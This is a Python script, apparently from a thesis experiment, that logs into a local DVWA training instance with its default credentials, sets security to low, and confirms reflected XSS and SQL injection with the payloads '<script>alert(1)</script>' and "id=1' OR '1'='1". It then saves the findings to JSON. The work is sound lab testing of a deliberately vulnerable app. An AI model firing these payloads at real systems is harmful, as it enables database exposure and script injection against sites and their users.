import requests, subprocess, sys, os, json, re

target = "http://127.0.0.1:3002"
TOOLS = "D:\\大论文\\tools"
findings = []
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

s = requests.Session()

# Step 1: Get login page + extract user_token
r = s.get(target + "/login.php", timeout=5)
token = re.search(r"name='user_token' value='([^']+)'", r.text)
user_token = token.group(1) if token else ""
print("=== Step 1: Login with CSRF token ===")
r = s.post(target + "/login.php", data={
    "username": "admin", "password": "password",
    "Login": "Login", "user_token": user_token
}, timeout=5)
print("  PHPSESSID: %s, login: HTTP %d" % (s.cookies.get("PHPSESSID","?"), r.status_code))

# Step 2: Setup DB
r = s.post(target + "/setup.php", data={"create_db":"Create/Reset Database"}, timeout=5)
print("  DB setup: %s" % ("OK" if "Database ready" in r.text else "Response: " + r.text[500:700]))

# Step 3: Set security low (needs another user_token)
r = s.get(target + "/security.php", timeout=5)
token = re.search(r"name='user_token' value='([^']+)'", r.text)
sec_token = token.group(1) if token else ""
r = s.post(target + "/security.php", data={
    "security": "low", "seclev_submit": "Submit", "user_token": sec_token
}, timeout=5)
print("  Security set to low, cookies: %s" % dict(s.cookies))

# Step 4: Verify access to vulnerability pages
print()
print("=== Step 2: Verify access ===")
r = s.get(target + "/vulnerabilities/sqli/?id=1&Submit=Submit", timeout=5)
if "login" in r.text.lower() and "password" in r.text.lower():
    print("  Still on login page! Trying alternative approach...")
    # Try adding security cookie manually
    s.cookies.set("security", "low", domain="127.0.0.1", path="/")
    r2 = s.get(target + "/vulnerabilities/sqli/?id=1&Submit=Submit", timeout=5)
    if "First name" in r2.text:
        print("  SQLi page: ACCESSIBLE with cookie fix")
else:
    print("  SQLi page: %d bytes" % len(r.text))

# If still not working, try direct cookie in headers  
if "login" in (r.text.lower() if "r" in dir() else "") or True:
    phpsessid = s.cookies.get("PHPSESSID", "")
    headers = {"Cookie": "PHPSESSID=%s; security=low" % phpsessid}
    r3 = requests.get(target + "/vulnerabilities/sqli/?id=1&Submit=Submit", headers=headers, timeout=5)
    if "First name" in r3.text:
        print("  Direct cookie approach: WORKS!")
        # Save for manual verification
        r4 = requests.get(target + "/vulnerabilities/xss_r/?name=<script>alert(1)</script>",
                          headers=headers, timeout=5)
        if "<script>alert(1)</script>" in r4.text:
            print("  XSS: CONFIRMED! Input reflected unencoded")
            findings.append({"target":"dvwa","scanner":"manual","type":"xss",
                "severity":"high","url":target+"/vulnerabilities/xss_r/",
                "desc":"Reflected XSS confirmed","evidence":"<script>alert(1)</script> reflected unencoded"})
        r5 = requests.get(target + "/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit",
                          headers=headers, timeout=5)
        if "First name" in r5.text and "Surname" in r5.text:
            print("  SQLi: CONFIRMED! id=1' OR '1'='1 returns user data")
            findings.append({"target":"dvwa","scanner":"manual","type":"sql_injection",
                "severity":"critical","url":target+"/vulnerabilities/sqli/",
                "desc":"SQL injection confirmed","evidence":"id=1' OR '1'='1 returned user data"})
    else:
        print("  Direct cookie: Still not working (%d bytes)" % len(r3.text))
        if len(r3.text) < 200:
            print("  Response: %s" % r3.text[:200])

print()
print("Re-checking session cookies:")
print("  %s" % dict(s.cookies))
print("  Direct headers: %s" % headers)

print()
print("=" * 60)
print("DVWA RESULTS")
print("=" * 60)
for f in findings:
    print("  [%s] [%s] %s | %s" % (f["severity"][:4], f["scanner"], f["type"], f["desc"][:80]))
print("Total: %d findings" % len(findings))

outpath = "scripts/experiment/real_findings_dvwa.json"
with open(outpath, "w", encoding="utf-8") as f:
    json.dump(findings, f, indent=2, ensure_ascii=False)
print("Saved to: %s" % outpath)
